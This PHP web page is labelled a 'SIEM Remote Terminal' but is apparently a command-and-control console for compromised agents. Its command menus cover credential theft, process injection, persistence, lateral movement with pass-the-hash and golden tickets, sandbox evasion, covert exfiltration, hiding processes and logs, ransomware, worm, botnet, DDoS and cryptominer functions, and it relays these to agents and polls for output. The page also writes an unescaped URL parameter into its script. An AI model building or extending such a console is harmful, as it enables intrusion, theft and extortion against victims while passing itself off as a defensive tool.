<?php
/**
 * SIEM Remote Terminal Interface v7
 * Enhanced with command categorization, real-time formatting, and advanced features
 */

session_start();

// Check if logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$agent = $_GET['agent'] ?? '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>SIEM Remote Terminal v7</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', 'Courier New', monospace; 
            background: #0a0e27; 
            color: #00ff00;
            overflow: hidden;
        }
        
        .main-container { display: flex; height: 100vh; }
        
        /* Sidebar - Agent List */
        .sidebar-agents {
            width: 200px;
            background: #0f1419;
            border-right: 1px solid #333;
            overflow-y: auto;
            padding: 15px;
        }
        
        .sidebar-agents h3 {
            color: #0066cc;
            margin-bottom: 12px;
            font-size: 12px;
            text-transform: uppercase;
        }
        
        .agent-item {
            padding: 10px;
            margin-bottom: 8px;
            background: #1a1f26;
            border-radius: 4px;
            cursor: pointer;
            border-left: 3px solid #333;
            transition: all 0.3s;
            font-size: 12px;
        }
        
        .agent-item:hover {
            background: #2a2a2a;
            border-left-color: #0066cc;
        }
        
        .agent-item.active {
            background: #0066cc;
            border-left-color: #00d4ff;
        }
        
        /* Command Categories Sidebar */
        .sidebar-commands {
            width: 220px;
            background: #0f1419;
            border-right: 1px solid #333;
            overflow-y: auto;
            padding: 15px;
        }
        
        .sidebar-commands h3 {
            color: #00d4ff;
            margin-bottom: 12px;
            font-size: 12px;
            text-transform: uppercase;
        }
        
        .command-category {
            margin-bottom: 15px;
        }
        
        .category-title {
            color: #0066cc;
            font-size: 11px;
            font-weight: bold;
            padding: 8px;
            background: #1a1f26;
            border-radius: 3px;
            cursor: pointer;
            user-select: none;
        }
        
        .category-title:hover {
            background: #252d36;
        }
        
        .category-commands {
            display: none;
            margin-top: 5px;
        }
        
        .category-commands.active {
            display: block;
        }
        
        .cmd-btn {
            display: block;
            width: 100%;
            padding: 6px 8px;
            margin-bottom: 3px;
            background: #1a1f26;
            border: none;
            color: #00ff00;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
            text-align: left;
            transition: all 0.2s;
            font-family: 'Courier New', monospace;
        }
        
        .cmd-btn:hover {
            background: #252d36;
            color: #00d4ff;
        }
        
        /* Main Content Area */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
            padding: 15px 20px;
            border-bottom: 1px solid #004499;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 20px;
            color: white;
        }
        
        .header-info {
            font-size: 12px;
            color: rgba(255,255,255,0.8);
        }
        
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 15px;
            overflow: hidden;
        }
        
        .terminal {
            flex: 1;
            background: #0a0e27;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 12px;
            overflow-y: auto;
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 12px;
            font-family: 'Courier New', monospace;
        }
        
        .terminal-line {
            margin-bottom: 4px;
            word-wrap: break-word;
        }
        
        .terminal-prompt {
            color: #00ff00;
            font-weight: bold;
        }
        
        .terminal-input {
            color: #00ff00;
        }
        
        .terminal-output {
            color: #00ff00;
        }
        
        .terminal-error {
            color: #ff3333;
        }
        
        .terminal-warning {
            color: #ffff00;
        }
        
        .terminal-success {
            color: #00cc66;
        }
        
        .terminal-status {
            color: #ffff00;
        }
        
        .terminal-info {
            color: #00d4ff;
        }
        
        /* Input Area */
        .input-section {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }
        
        .input-group {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .input-group input {
            padding: 10px;
            background: #1a1f26;
            border: 1px solid #333;
            color: #00ff00;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        
        .input-group input::placeholder {
            color: #666;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 5px rgba(0, 102, 204, 0.3);
        }
        
        .command-suggestions {
            display: none;
            position: absolute;
            background: #1a1f26;
            border: 1px solid #333;
            border-radius: 4px;
            max-height: 150px;
            overflow-y: auto;
            z-index: 100;
            width: 300px;
        }
        
        .command-suggestions.active {
            display: block;
        }
        
        .suggestion-item {
            padding: 8px 12px;
            cursor: pointer;
            border-bottom: 1px solid #333;
            font-size: 11px;
        }
        
        .suggestion-item:hover {
            background: #252d36;
        }
        
        .button-group {
            display: flex;
            gap: 8px;
        }
        
        .btn {
            padding: 10px 16px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.3s;
            font-weight: bold;
        }
        
        .btn:hover {
            background: #004499;
        }
        
        .btn-secondary {
            background: #333;
        }
        
        .btn-secondary:hover {
            background: #444;
        }
        
        .btn-danger {
            background: #ff3333;
        }
        
        .btn-danger:hover {
            background: #cc0000;
        }
        
        .status-bar {
            padding: 10px 15px;
            background: #1a1f26;
            border-top: 1px solid #333;
            font-size: 11px;
            color: #999;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-indicator.connected {
            background: #00cc66;
        }
        
        .status-indicator.disconnected {
            background: #ff3333;
        }
        
        .status-indicator.busy {
            background: #ffff00;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Help Panel */
        .help-panel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            overflow-y: auto;
        }
        
        .help-content {
            background: #0a0e27;
            margin: 20px auto;
            padding: 30px;
            max-width: 1000px;
            border: 1px solid #333;
            border-radius: 4px;
            color: #00ff00;
        }
        
        .help-content h2 {
            color: #0066cc;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        
        .help-section {
            margin-bottom: 20px;
        }
        
        .help-section h3 {
            color: #00d4ff;
            margin-bottom: 10px;
            font-size: 13px;
        }
        
        .help-command {
            margin-left: 15px;
            margin-bottom: 6px;
            font-size: 11px;
            line-height: 1.4;
            color: #b0b8c1;
        }
        
        .help-close {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #0066cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .help-close:hover {
            background: #004499;
        }
        
        /* Scrollbar Styling */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0f1419;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Agent Sidebar -->
        <div class="sidebar-agents">
            <h3>📡 Agents</h3>
            <ul class="agent-list" id="agentList">
                <li style="color: #666; text-align: center; padding: 20px;">Loading...</li>
            </ul>
        </div>
        
        <!-- Command Categories Sidebar -->
        <div class="sidebar-commands">
            <h3>⚙️ Commands</h3>
            <div id="commandCategories"></div>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
            <!-- Header -->
            <div class="header">
                <div>
                    <h1>🖥️ Remote Terminal v7</h1>
                    <div class="header-info" id="agentInfo">Select an agent to begin</div>
                </div>
                <div>
                    <a href="dashboard.php" style="color: white; text-decoration: none; margin-right: 20px;">← Dashboard</a>
                    <a href="?logout=1" style="color: white; text-decoration: none;">Logout</a>
                </div>
            </div>
            
            <!-- Terminal -->
            <div class="content">
                <div class="terminal" id="terminal">
                    <div class="terminal-line terminal-info">Welcome to SIEM Remote Terminal v7</div>
                    <div class="terminal-line terminal-info">Select an agent from the left sidebar to begin</div>
                </div>
                
                <!-- Input Area -->
                <div class="input-section">
                    <div class="input-group">
                        <input type="text" id="commandInput" placeholder="Enter command (type 'help' for all commands, or click command buttons)..." autocomplete="off">
                        <div class="command-suggestions" id="suggestions"></div>
                    </div>
                    <div class="button-group">
                        <button class="btn" onclick="executeCommand()">Execute</button>
                        <button class="btn btn-secondary" onclick="showHelp()">Help</button>
                        <button class="btn btn-secondary" onclick="clearTerminal()">Clear</button>
                    </div>
                </div>
            </div>
            
            <!-- Status Bar -->
            <div class="status-bar">
                <div>
                    <span class="status-indicator disconnected" id="statusIndicator"></span>
                    <span id="statusText">Ready. Select an agent to connect.</span>
                </div>
                <div id="commandStats">Commands: 0 | Errors: 0</div>
            </div>
        </div>
    </div>
    
    <!-- Help Panel -->
    <div class="help-panel" id="helpPanel">
        <button class="help-close" onclick="closeHelp()">✕ Close</button>
        <div class="help-content" id="helpContent"></div>
    </div>
    
    <script>
        let selectedAgent = '<?php echo $agent; ?>';
        let commandHistory = [];
        let historyIndex = -1;
        let commandStats = { total: 0, errors: 0 };
        
        const commandCategories = {
            'Credential Theft': [
                { cmd: 'steal:browser', desc: 'Extract browser credentials (Chrome/Firefox/Edge)' },
                { cmd: 'steal:ssh', desc: 'Extract SSH private keys' },
                { cmd: 'steal:api', desc: 'Harvest API keys and tokens' },
                { cmd: 'steal:ntlm', desc: 'Dump NTLM hashes' },
                { cmd: 'steal:kerberos', desc: 'Extract Kerberos tickets' }
            ],
            'Process Injection': [
                { cmd: 'inject:list', desc: 'List processes for injection' },
                { cmd: 'inject:inject:pid:payload', desc: 'Inject payload into process' },
                { cmd: 'inject:migrate', desc: 'Migrate to different process' }
            ],
            'Persistence': [
                { cmd: 'persist:registry', desc: 'Add to registry Run key' },
                { cmd: 'persist:startup', desc: 'Add to startup folder' },
                { cmd: 'persist:task', desc: 'Create scheduled task' },
                { cmd: 'persist_adv:wmi', desc: 'WMI event subscription' },
                { cmd: 'persist_adv:com', desc: 'COM object hijacking' },
                { cmd: 'persist_adv:ifeo', desc: 'Image File Execution Options' },
                { cmd: 'persist_adv:dll', desc: 'DLL search order hijacking' }
            ],
            'Lateral Movement': [
                { cmd: 'lateral:pth:user:domain:hash', desc: 'Pass-the-Hash attack' },
                { cmd: 'lateral:kerberoast:target', desc: 'Kerberoasting' },
                { cmd: 'lateral:golden:domain', desc: 'Golden ticket creation' },
                { cmd: 'lateral:silver:service:host', desc: 'Silver ticket creation' },
                { cmd: 'lateral:overpass', desc: 'Overpass-the-Hash' }
            ],
            'Network Pivoting': [
                { cmd: 'pivot:socks:port', desc: 'SOCKS proxy server' },
                { cmd: 'pivot:dns:domain', desc: 'DNS tunneling' },
                { cmd: 'pivot:http:url', desc: 'HTTP tunneling' },
                { cmd: 'pivot:smb', desc: 'SMB relay attack' },
                { cmd: 'pivot:llmnr', desc: 'LLMNR/NBNS spoofing' }
            ],
            'Anti-Analysis': [
                { cmd: 'anti:vm', desc: 'VM detection' },
                { cmd: 'anti:sandbox', desc: 'Sandbox detection' },
                { cmd: 'anti:debugger', desc: 'Debugger detection' },
                { cmd: 'anti:analysis', desc: 'Analysis tool detection' },
                { cmd: 'anti:signature', desc: 'Signature evasion' }
            ],
            'Exfiltration': [
                { cmd: 'exfil:dns:data', desc: 'DNS exfiltration' },
                { cmd: 'exfil:icmp:data', desc: 'ICMP tunneling' },
                { cmd: 'exfil:http:url', desc: 'HTTP exfiltration' },
                { cmd: 'exfil:email:address', desc: 'Email exfiltration' },
                { cmd: 'exfil:cloud:service', desc: 'Cloud storage exfiltration' }
            ],
            'System Monitoring': [
                { cmd: 'monitor:file', desc: 'File system monitoring' },
                { cmd: 'monitor:registry', desc: 'Registry monitoring' },
                { cmd: 'monitor:process', desc: 'Process monitoring' },
                { cmd: 'monitor:network', desc: 'Network monitoring' },
                { cmd: 'monitor:eventlog', desc: 'Event log monitoring' }
            ],
            'Stealth': [
                { cmd: 'stealth:hide_process:pid', desc: 'Hide process' },
                { cmd: 'stealth:hide_file:path', desc: 'Hide file' },
                { cmd: 'stealth:hide_registry:key', desc: 'Hide registry key' },
                { cmd: 'stealth:hide_network', desc: 'Hide network connections' },
                { cmd: 'stealth:hide_logs', desc: 'Hide event logs' }
            ],
            'Malware': [
                { cmd: 'malware:ransomware:dir', desc: 'Ransomware functionality' },
                { cmd: 'malware:worm', desc: 'Worm propagation' },
                { cmd: 'malware:botnet', desc: 'Botnet capabilities' },
                { cmd: 'malware:ddos:target', desc: 'DDoS functionality' },
                { cmd: 'malware:cryptominer', desc: 'Cryptominer integration' }
            ],
            'System Info': [
                { cmd: 'whoami', desc: 'Current user' },
                { cmd: 'systeminfo', desc: 'System information' },
                { cmd: 'tasklist', desc: 'Running processes' },
                { cmd: 'ipconfig', desc: 'Network configuration' },
                { cmd: 'screenshot', desc: 'Capture screen' }
            ]
        };
        
        // Initialize
        window.addEventListener('load', () => {
            loadAgents();
            buildCommandCategories();
            if (selectedAgent) selectAgent(selectedAgent);
        });
        
        function loadAgents() {
            fetch('/SIEM/api/remote-access.php?action=get_agents')
                .then(r => r.json())
                .then(data => {
                    const list = document.getElementById('agentList');
                    list.innerHTML = '';
                    
                    if (data.agents && data.agents.length > 0) {
                        data.agents.forEach(agent => {
                            const li = document.createElement('li');
                            li.className = 'agent-item' + (agent.name === selectedAgent ? ' active' : '');
                            li.innerHTML = `<strong>${agent.name}</strong><br><small>${agent.status}</small>`;
                            li.onclick = () => selectAgent(agent.name);
                            list.appendChild(li);
                        });
                    } else {
                        list.innerHTML = '<li style="color: #666; text-align: center; padding: 20px;">No agents</li>';
                    }
                });
        }
        
        function buildCommandCategories() {
            const container = document.getElementById('commandCategories');
            container.innerHTML = '';
            
            for (const [category, commands] of Object.entries(commandCategories)) {
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'command-category';
                
                const titleDiv = document.createElement('div');
                titleDiv.className = 'category-title';
                titleDiv.textContent = category;
                titleDiv.onclick = () => toggleCategory(titleDiv);
                
                const commandsDiv = document.createElement('div');
                commandsDiv.className = 'category-commands';
                
                commands.forEach(cmd => {
                    const btn = document.createElement('button');
                    btn.className = 'cmd-btn';
                    btn.textContent = cmd.cmd;
                    btn.title = cmd.desc;
                    btn.onclick = () => {
                        document.getElementById('commandInput').value = cmd.cmd;
                        document.getElementById('commandInput').focus();
                    };
                    commandsDiv.appendChild(btn);
                });
                
                categoryDiv.appendChild(titleDiv);
                categoryDiv.appendChild(commandsDiv);
                container.appendChild(categoryDiv);
            }
        }
        
        function toggleCategory(titleDiv) {
            const commandsDiv = titleDiv.nextElementSibling;
            commandsDiv.classList.toggle('active');
        }
        
        function selectAgent(agent) {
            selectedAgent = agent;
            document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('active'));
            event.target?.closest('.agent-item')?.classList.add('active');
            
            document.getElementById('agentInfo').textContent = `Connected to: ${agent}`;
            document.getElementById('statusIndicator').className = 'status-indicator connected';
            document.getElementById('statusText').textContent = `Connected to ${agent}. Ready to execute commands.`;
            
            clearTerminal();
        }
        
        function executeCommand() {
            const input = document.getElementById('commandInput');
            const command = input.value.trim();
            
            if (!command) {
                alert('Please enter a command');
                return;
            }
            
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            // Add to history
            if (!commandHistory.includes(command)) {
                commandHistory.unshift(command);
                if (commandHistory.length > 50) commandHistory.pop();
            }
            
            // Display command
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="terminal-prompt">$</span> <span class="terminal-input">${escapeHtml(command)}</span>`;
            terminal.appendChild(line);
            
            // Show executing status
            const statusLine = document.createElement('div');
            statusLine.className = 'terminal-line';
            statusLine.id = 'status-' + Date.now();
            statusLine.innerHTML = `<span class="terminal-status">⏳ Executing...</span>`;
            terminal.appendChild(statusLine);
            
            document.getElementById('statusIndicator').className = 'status-indicator busy';
            terminal.scrollTop = terminal.scrollHeight;
            
            // Send command
            fetch(`/SIEM/api/remote-access.php?action=send_command&agent=${selectedAgent}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: command})
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'ok') {
                    document.getElementById('statusText').textContent = `Command sent. Waiting for response...`;
                    input.value = '';
                    pollCommandResults(command);
                }
            })
            .catch(err => {
                statusLine.innerHTML = `<span class="terminal-error">✗ Error: ${err.message}</span>`;
                document.getElementById('statusText').textContent = `Error: ${err.message}`;
                commandStats.errors++;
                updateStats();
            });
        }
        
        function pollCommandResults(command) {
            let lastCommandId = null;
            const pollInterval = setInterval(() => {
                fetch(`/SIEM/api/remote-access.php?action=get_command_results&agent=${selectedAgent}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.commands && data.commands.length > 0) {
                            const cmd = data.commands[0];
                            
                            if (cmd.status !== 'pending' && (lastCommandId === null || cmd.id !== lastCommandId)) {
                                lastCommandId = cmd.id;
                                clearInterval(pollInterval);
                                
                                const terminal = document.getElementById('terminal');
                                
                                // Remove status line
                                const statusLines = terminal.querySelectorAll('[id^="status-"]');
                                statusLines.forEach(el => el.remove());
                                
                                // Display output
                                if (cmd.output) {
                                    const outputLines = cmd.output.split('\n');
                                    outputLines.forEach(line => {
                                        if (line.trim()) {
                                            const outputLine = document.createElement('div');
                                            outputLine.className = 'terminal-line terminal-output';
                                            outputLine.textContent = line;
                                            terminal.appendChild(outputLine);
                                        }
                                    });
                                }
                                
                                // Display error if any
                                if (cmd.error) {
                                    const errorLines = cmd.error.split('\n');
                                    errorLines.forEach(line => {
                                        if (line.trim()) {
                                            const errorLine = document.createElement('div');
                                            errorLine.className = 'terminal-line terminal-error';
                                            errorLine.textContent = line;
                                            terminal.appendChild(errorLine);
                                        }
                                    });
                                }
                                
                                // Add prompt
                                const promptLine = document.createElement('div');
                                promptLine.className = 'terminal-line';
                                promptLine.innerHTML = `<span class="terminal-prompt">$</span>`;
                                terminal.appendChild(promptLine);
                                
                                terminal.scrollTop = terminal.scrollHeight;
                                document.getElementById('statusIndicator').className = 'status-indicator connected';
                                document.getElementById('statusText').textContent = `Command completed.`;
                                
                                commandStats.total++;
                                updateStats();
                            }
                        }
                    });
            }, 500);
            
            setTimeout(() => clearInterval(pollInterval), 30000);
        }
        
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '<div class="terminal-line terminal-prompt">$ Ready</div>';
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function showHelp() {
            const helpContent = document.getElementById('helpContent');
            let html = '<h2>🔧 SIEM Remote Terminal v7 - Command Reference</h2>';
            
            for (const [category, commands] of Object.entries(commandCategories)) {
                html += `<div class="help-section"><h3>${category}</h3>`;
                commands.forEach(cmd => {
                    html += `<div class="help-command"><strong>${cmd.cmd}</strong> - ${cmd.desc}</div>`;
                });
                html += '</div>';
            }
            
            helpContent.innerHTML = html;
            document.getElementById('helpPanel').style.display = 'block';
        }
        
        function closeHelp() {
            document.getElementById('helpPanel').style.display = 'none';
        }
        
        function updateStats() {
            document.getElementById('commandStats').textContent = 
                `Commands: ${commandStats.total} | Errors: ${commandStats.errors}`;
        }
        
        // Keyboard shortcuts
        document.getElementById('commandInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                executeCommand();
            } else if (e.key === 'ArrowUp') {
                historyIndex++;
                if (historyIndex < commandHistory.length) {
                    e.target.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                historyIndex--;
                if (historyIndex >= 0) {
                    e.target.value = commandHistory[historyIndex];
                } else {
                    e.target.value = '';
                    historyIndex = -1;
                }
            }
        });
        
        // Close help on outside click
        document.getElementById('helpPanel').addEventListener('click', (e) => {
            if (e.target.id === 'helpPanel') {
                closeHelp();
            }
        });
        
        // Refresh agents every 10 seconds
        setInterval(loadAgents, 10000);
    </script>
</body>
</html>
